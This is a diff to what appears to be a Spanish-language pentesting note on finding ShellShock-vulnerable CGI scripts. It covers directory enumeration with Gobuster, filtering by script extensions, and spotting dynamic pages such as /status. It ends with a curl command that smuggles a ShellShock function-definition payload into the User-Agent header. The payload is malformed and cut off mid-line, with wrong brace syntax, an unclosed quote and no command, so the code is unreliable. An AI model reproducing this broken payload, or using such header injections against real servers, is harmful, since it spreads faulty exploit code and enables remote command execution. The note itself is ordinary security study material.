@@ -5,4 +5,9 @@
 
 Durante la enumeración de la pagina web con herramientas como [[GOBUSTER]] hacemos una enumeración de directorios, si se encuentra u `/cgi-bin/` es una posible señal de ShellShock.
 
-Podemos volver a enumerar la web con 
+Podemos volver a enumerar la web apuntando a ese directorio y filtrando por extensiones `.pl, .sg, .cgi`
+
+Con los datos que obtengamos navegamos a ese archivo, si vemos que es una pagina dinámica que se actualiza cada cierto tiempo como por ejemplo un `/status` es que se esta ejecutando un comando a tiempo real.
+
+La forma de comprometerlo seria con un [[CURL]]
+`curl -s <IP_Objetivo/cgi-bin/status -H "User-Agent: () {:;];`
